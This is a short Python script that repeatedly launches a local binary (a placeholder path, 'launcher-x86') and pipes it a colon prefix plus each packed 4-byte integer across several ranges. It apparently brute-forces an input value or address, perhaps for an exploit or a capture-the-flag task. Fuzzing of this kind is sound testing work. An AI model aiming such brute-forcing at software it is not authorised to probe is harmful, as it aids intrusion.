import struct
import subprocess
import time

prefix = b"::::::::::::::"
program = "/path/to/launcher-x86"


def launch(program, arg):
    try:
        p = subprocess.Popen([program], stdin=subprocess.PIPE)
        p.communicate(arg)
    except Exception as e:
        print(e)


def loop(range, pack):
    for i in range:
        arg = prefix + struct.pack(pack, i)
        print(arg)
        launch(program, arg)


def main():
    loop(range(0x00, 0x8000), "I")
    time.sleep(5)
    loop(range(0xa000, 0x10000), "I")
    time.sleep(5)
    loop(range(0x10000, 0x18000), "I")
    time.sleep(5)
    loop(range(0x18000, 0x20000), "I")
    time.sleep(5)
    loop(range(0x20000, 0x28000), "I")
    time.sleep(5)
    loop(range(0x28000, 0x30000), "I")


if __name__ == "__main__":
    main()
